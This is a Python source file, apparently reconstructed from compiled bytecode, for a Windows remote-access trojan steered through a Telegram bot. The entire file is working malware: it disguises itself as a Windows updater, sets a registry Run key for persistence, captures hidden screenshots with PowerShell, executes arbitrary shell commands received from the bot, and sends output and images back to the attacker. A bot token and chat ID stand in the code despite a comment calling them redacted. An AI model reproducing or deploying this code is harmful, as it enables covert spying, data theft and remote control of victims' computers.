import os
import time
import subprocess
import requests
# Credential recovered from the bytecode has been redacted in this reconstruction.
TOKEN = "8876255842:AAF93POgQf1u-RbfzNNWo8boQK9cAvIKPFM"
CHAT_ID = "8604350172"
LAST_UPDATE_ID = 0
def install_persistence():
    try:
        appdata_dir = os.environ.get("APPDATA")
        malware_folder = os.path.join(appdata_dir, "WindowsUpdate")
        if not os.path.exists(malware_folder):
            os.makedirs(malware_folder)
        target_exe_path = os.path.join(malware_folder, "win_updater.exe")
        current_file = os.path.abspath(subprocess.sys.argv[0])
        if os.path.abspath(target_exe_path) != current_file:
            import shutil
            import winreg
            shutil.copy(current_file, target_exe_path)
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(
                key,
                "WindowsUpdater",
                0,
                winreg.REG_SZ,
                target_exe_path,
            )
            winreg.CloseKey(key)
    except Exception:
        pass
def take_screenshot():
    screenshot_path = os.path.join(os.environ["TEMP"], "sys_temp.png")
    ps_script = (
        "[Reflection.Assembly]::LoadWithPartialName('System.Drawing') | Out-Null; "
        "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; "
        "$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
        "$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); "
        "$graphics = [System.Drawing.Graphics]::FromImage($bmp); "
        "$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); "
        "$bmp.Save('"
        + screenshot_path.replace("\\", "\\\\")
        + "', [System.Drawing.Imaging.ImageFormat]::Png); "
        "$graphics.Dispose(); $bmp.Dispose();"
    )
    subprocess.run(
        ["powershell", "-Command", ps_script],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    return screenshot_path


def send_text_back(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            "chat_id": str(CHAT_ID),
            "text": text,
        }
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass
def send_file_back(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    payload = {"chat_id": CHAT_ID}
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            requests.post(
                url,
                data=payload,
                files=files,
                timeout=10,
            )
    except Exception:
        pass
def listen_and_execute():
    global LAST_UPDATE_ID
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {"offset": LAST_UPDATE_ID + 1, "timeout": 5}
    try:
        response = requests.get(url, params=params, timeout=10).json()
        if response.get("ok") and response.get("result"):
            for update in response["result"]:
                LAST_UPDATE_ID = update["update_id"]
                message = update.get("message", {})
                text = message.get("text", "").strip()

                if text == "SCREENSHOT":
                    path = take_screenshot()

                    if os.path.exists(path):
                        send_file_back(path)

                        try:
                            os.remove(path)
                        except Exception:
                            pass
                elif text.startswith("CMD "):
                    cmd_str = text[4:]
                    output = subprocess.getoutput(cmd_str)
                    send_text_back(
                        output.strip() if output.strip() else "[+] Chay thanh cong."
                    )
    except Exception:
        pass
if __name__ == "__main__":
    install_persistence()
    while True:
        listen_and_execute()
        time.sleep(2)
